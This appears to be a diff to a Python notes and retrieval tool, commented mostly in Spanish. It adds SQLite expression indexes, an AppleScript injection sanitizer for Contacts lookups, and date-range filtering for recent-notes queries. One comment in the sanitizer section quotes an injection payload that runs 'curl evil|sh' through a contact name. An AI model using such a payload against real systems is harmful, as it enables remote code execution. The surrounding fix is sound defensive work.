@@ -5738,6 +5738,14 @@ _TELEMETRY_DDL: tuple[tuple[str, tuple[str, ...]], ...] = (
             "CREATE INDEX IF NOT EXISTS ix_rag_queries_ts ON rag_queries(ts)",
             "CREATE INDEX IF NOT EXISTS ix_rag_queries_session ON rag_queries(session)",
             "CREATE INDEX IF NOT EXISTS ix_rag_queries_cmd_ts ON rag_queries(cmd, ts)",
+            # Expression-index sobre json_extract(extra_json, '$.turn_id').
+            # SQLite >= 3.9 usa el índice cuando la query repite la misma
+            # expresión literal. Esto evita full scan en el redo lookup
+            # de web/server.py:_redo_payload_lookup. Verificable con
+            # EXPLAIN QUERY PLAN: "SEARCH rag_queries USING INDEX
+            # ix_rag_queries_turn_id (<expr>=?)".
+            "CREATE INDEX IF NOT EXISTS ix_rag_queries_turn_id "
+            "ON rag_queries(json_extract(extra_json, '$.turn_id'))",
             # Composite for "recent queries of session X" — session-scoped
             # history reads in chat()/web (dashboard, session drawer) go
             # via (session, ts DESC); without this covering index SQLite
@@ -5813,6 +5821,13 @@ _TELEMETRY_DDL: tuple[tuple[str, tuple[str, ...]], ...] = (
             " UNIQUE(turn_id, rating, ts)"
             ")",
             "CREATE INDEX IF NOT EXISTS ix_rag_feedback_ts ON rag_feedback(ts)",
+            # Expression-index sobre json_extract(extra_json, '$.corrective_path').
+            # Acelera `rag tune` (recall del feedback con corrective_path),
+            # `rag feedback status`, `rag feedback harvest`, y los
+            # _feedback_augmented_cases readers — varios call sites con
+            # SUM(CASE WHEN ...) sobre json_extract en hot path.
+            "CREATE INDEX IF NOT EXISTS ix_rag_feedback_corrective "
+            "ON rag_feedback(json_extract(extra_json, '$.corrective_path'))",
         ),
     ),
     (
@@ -14033,6 +14048,47 @@ def _match_mentions_in_query(query: str, vault_root: Path | None = None) -> list
     return [p for _, p in hits[:_MENTIONS_MAX_PER_QUERY]]
 
 
+# ── AppleScript injection guard ───────────────────────────────────────────────
+# Los valores de usuario/LLM que se interpolan en scripts de osascript solo
+# escapan comillas dobles (replace('"', '\\"')). Eso no cubre:
+#   - Backslash embebido: `Juan\` → queda como secuencia de escape inválida.
+#   - Inyección por \n / \r que cierra el string y abre una nueva sentencia.
+#   - Payloads: `Juan" & (do shell script "curl evil|sh") & "`.
+#
+# Fix: _sanitize_applescript_string hace escaping completo (backslash primero,
+# luego comilla doble) y valida con allowlist de chars seguros para nombres,
+# listas e IDs. Si no matchea → retorna None y el caller aborta.
+
+_APPLESCRIPT_SAFE_RE = re.compile(
+    r"^[\w\s\-_'.@#+À-ɏ]{1,200}$"
+)
+
+
+def _sanitize_applescript_string(value: str) -> "str | None":
+    """Sanitiza un valor para interpolación segura en scripts de osascript.
+
+    Retorna la versión escapada del string si es seguro, o None si contiene
+    caracteres peligrosos para inyección (paréntesis de shell, backquote,
+    comillas unicode, control chars, etc.).
+
+    Uso obligatorio antes de interpolar input de usuario/LLM en osascript:
+        safe = _sanitize_applescript_string(user_input)
+        if safe is None:
+            return None  # abortar
+        script = f'... "{safe}" ...'
+    """
+    if not value:
+        return ""
+    # Allowlist: letras (incl. Unicode Latin Extended U+00C0-U+024F para
+    # nombres europeos/latinoamericanos), dígitos, espacios, puntuación
+    # inocua en nombres (punto, guion, apóstrofe, @, #, +). Sin paréntesis,
+    # sin backquote, sin ampersand, sin CR/LF, sin comillas alternativas.
+    if not _APPLESCRIPT_SAFE_RE.match(value):
+        return None
+    # Escaping robusto: backslash primero (evita double-escape), luego ".
+    return value.replace("\\", "\\\\").replace('"', '\\"')
+
+
 def _osascript_contact_search(predicate: str, value: str) -> dict | None:
     """One osascript query against Contacts. Returns first hit as dict or None.
 
@@ -14042,7 +14098,11 @@ def _osascript_contact_search(predicate: str, value: str) -> dict | None:
     osascript; logs one warning on first permission failure.
     """
     global _contacts_permission_warned
-    safe = (value or "").replace('"', '\\"')
+    safe = _sanitize_applescript_string((value or "").strip())
+    if safe is None:
+        # Input contiene caracteres peligrosos — abortar silenciosamente.
+        _silent_log("applescript_injection_blocked", {"value_preview": (value or "")[:40]})
+        return None
     # Pre-flight: asegurar que Contacts.app esté corriendo en background.
     # Observado 2026-04-24 (Fer F.): sin esto, osascript fallaba con
     # `Contacts got an error: Application isn't running. (-600)` cuando
@@ -16828,10 +16888,56 @@ def handle_list(col: SqliteVecCollection, params: dict, limit: int = 50) -> list
     return files[:limit]
 
 
-def handle_recent(col: SqliteVecCollection, params: dict, limit: int = 20) -> list[dict]:
-    """RECENT intent — returns files sorted by `modified` frontmatter desc."""
+def handle_recent(
+    col: SqliteVecCollection,
+    params: dict,
+    limit: int = 20,
+    *,
+    question: str | None = None,
+) -> list[dict]:
+    """RECENT intent — returns files sorted by `modified` frontmatter desc.
+
+    Audit 2026-04-30 (Fix 2): pre-fix la firma no aceptaba `question`, así
+    que aunque `detect_temporal_intent("notas de esta semana")` parseaba la
+    ventana `[lunes, hoy)`, el handler ordenaba por `modified` global y
+    devolvía el top-20 sin filtrar — el user pedía "esta semana" y recibía
+    notas de hace 2 meses. Ahora, si `question` se pasa y el helper devuelve
+    una ventana epoch `(ts_start, ts_end)`, filtramos `metas` por ese rango
+    antes de ordenar. Pass-through opcional — sin `question` el comporta-
+    miento legacy (top-20 by modified desc, sin filtro temporal) se preserva.
+    """
     c = _load_corpus(col)
     files = _filter_files(c["metas"], params.get("tag"), params.get("folder"))
+    # Temporal-window filter when the caller passes the original question.
+    # The helper returns ((ts_start, ts_end), cleaned_query) when it parses
+    # an anchor; otherwise (None, text). We only narrow when the range is
+    # explicit. `modified` (and `created` fallback) son ISO strings — los
+    # convertimos a epoch antes de comparar; metas con stamp inválido caen
+    # silenciosamente fuera del window (no ranking sin signal temporal).
+    if question:
+        try:
+            rng, _ = detect_temporal_intent(question)
+        except Exception:
+            rng = None
+        if rng is not None:
+            ts_start, ts_end = rng
+            def _meta_epoch(m: dict) -> float | None:
+                stamp = m.get("modified") or m.get("created") or ""
+                if not stamp:
+                    return None
+                try:
+                    s = stamp.replace("Z", "+00:00") if stamp.endswith("Z") else stamp
+                    return datetime.fromisoformat(s).timestamp()
+                except (ValueError, AttributeError):
+                    return None
+            filtered: list[dict] = []
+            for m in files:
+                ep = _meta_epoch(m)
+                if ep is None:
+                    continue
+                if ts_start <= ep < ts_end:
+                    filtered.append(m)
+            files = filtered
     # Sort by modified date (ISO string sorts lexicographically correctly).
     files.sort(key=lambda m: m.get("modified") or m.get("created") or "", reverse=True)
     return files[:limit]
@@ -28161,7 +28267,11 @@ def query(
                 )
                 render_file_list("notas", files)
         elif intent == "recent":
-            files = handle_recent(col, intent_params)
+            # Audit 2026-04-30 (Fix 2): pasamos `effective_question` al handler
+            # para que filtre por la ventana temporal del query ("esta semana"
+            # → [lunes, hoy)). Sin esto el handler devolvía top-20 by modified
+            # desc ignorando el rango pedido.
+            files = handle_recent(col, intent_params, question=effective_question)
             if plain:
                 click.echo(f"{len(files)} nota(s) recientes ({params_str})")
                 for f in files:
